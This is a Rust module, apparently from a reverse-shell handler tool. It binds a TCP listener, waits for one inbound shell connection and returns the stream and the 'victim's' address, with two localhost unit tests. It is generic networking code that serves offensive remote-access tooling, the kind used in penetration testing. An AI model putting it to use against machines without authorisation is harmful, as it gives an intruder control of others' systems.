//! TCP listener for reverse shell connections.
//!
//! Wraps [`TcpListener`] to accept a single inbound connection and
//! return the stream along with the victim's address.

use tokio::net::TcpListener;

use crate::error::ShellHandlerError;

/// Bind to `addr:port` and wait for one reverse shell connection.
///
/// Returns the connected stream and the victim's socket address.
pub async fn listen(addr: &str, port: u16) -> Result<(tokio::net::TcpStream, std::net::SocketAddr), ShellHandlerError> {
    let bind_addr = format!("{addr}:{port}");
    let listener = TcpListener::bind(&bind_addr)
        .await
        .map_err(|source| ShellHandlerError::BindFailed {
            addr: bind_addr.clone(),
            source,
        })?;
    let (stream, peer_addr) = listener
        .accept()
        .await
        .map_err(|source| ShellHandlerError::AcceptFailed {
            addr: bind_addr,
            source,
        })?;
    Ok((stream, peer_addr))
}

#[cfg(test)]
mod tests {
    use super::*;
    use tokio::net::TcpStream;
    use tokio::time::{sleep, Duration};

    #[tokio::test]
    async fn listen_accepts_real_connection() {
        // Find a free port by binding a probe, then drop it
        let probe = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let free_port = probe.local_addr().unwrap().port();
        drop(probe);

        let handle = tokio::spawn(async move {
            listen("127.0.0.1", free_port).await
        });

        // Give listen() a moment to bind
        sleep(Duration::from_millis(50)).await;
        let _victim = TcpStream::connect(format!("127.0.0.1:{free_port}"))
            .await
            .unwrap();

        let result = handle.await.unwrap();
        assert!(result.is_ok());
    }

    #[tokio::test]
    async fn listen_bind_failure() {
        // Bind a listener to a port, then try to listen on the same port
        let occupied = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let occupied_port = occupied.local_addr().unwrap().port();

        let result = listen("127.0.0.1", occupied_port).await;
        assert!(result.is_err());
        assert!(matches!(result.unwrap_err(), ShellHandlerError::BindFailed { .. }));

        drop(occupied);
    }
}
